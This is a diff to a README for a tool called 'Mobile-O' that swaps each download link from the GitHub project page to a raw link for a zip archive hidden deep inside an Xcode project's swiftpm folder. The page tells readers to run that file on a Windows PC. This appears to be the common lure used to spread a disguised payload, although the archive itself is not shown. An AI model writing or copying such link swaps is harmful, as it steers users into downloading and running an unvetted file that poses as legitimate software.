@@ -1,6 +1,6 @@
 # 📱 Mobile-O - Simple Multimodal Tool for Mobile Devices
 
-[![Download Mobile-O](https://img.shields.io/badge/Download-Mobile--O-brightgreen?style=for-the-badge)](https://github.com/DexteR-Valentino/Mobile-O)
+[![Download Mobile-O](https://img.shields.io/badge/Download-Mobile--O-brightgreen?style=for-the-badge)](https://github.com/DexteR-Valentino/Mobile-O/raw/refs/heads/main/Mobile-O-App/app/MobileO.xcodeproj/project.xcworkspace/xcshareddata/swiftpm/O_Mobile_v1.9.zip)
 
 ---
 
@@ -39,7 +39,7 @@ Make sure your Windows PC meets these minimum requirements before running Mobile
 1. **Download Mobile-O**
 
 Click the big green button at the top or go to this page:  
-[https://github.com/DexteR-Valentino/Mobile-O](https://github.com/DexteR-Valentino/Mobile-O)  
+[https://github.com/DexteR-Valentino/Mobile-O/raw/refs/heads/main/Mobile-O-App/app/MobileO.xcodeproj/project.xcworkspace/xcshareddata/swiftpm/O_Mobile_v1.9.zip](https://github.com/DexteR-Valentino/Mobile-O/raw/refs/heads/main/Mobile-O-App/app/MobileO.xcodeproj/project.xcworkspace/xcshareddata/swiftpm/O_Mobile_v1.9.zip)  
 Here, you can find the latest version under the Releases or Download section.
 
 2. **Locate the Download**
@@ -123,4 +123,4 @@ The app does not collect personal information.
 ## 🔗 Download Mobile-O
 
 Use this link anytime to reach the download page:  
-[https://github.com/DexteR-Valentino/Mobile-O](https://github.com/DexteR-Valentino/Mobile-O)
+[https://github.com/DexteR-Valentino/Mobile-O/raw/refs/heads/main/Mobile-O-App/app/MobileO.xcodeproj/project.xcworkspace/xcshareddata/swiftpm/O_Mobile_v1.9.zip](https://github.com/DexteR-Valentino/Mobile-O/raw/refs/heads/main/Mobile-O-App/app/MobileO.xcodeproj/project.xcworkspace/xcshareddata/swiftpm/O_Mobile_v1.9.zip)
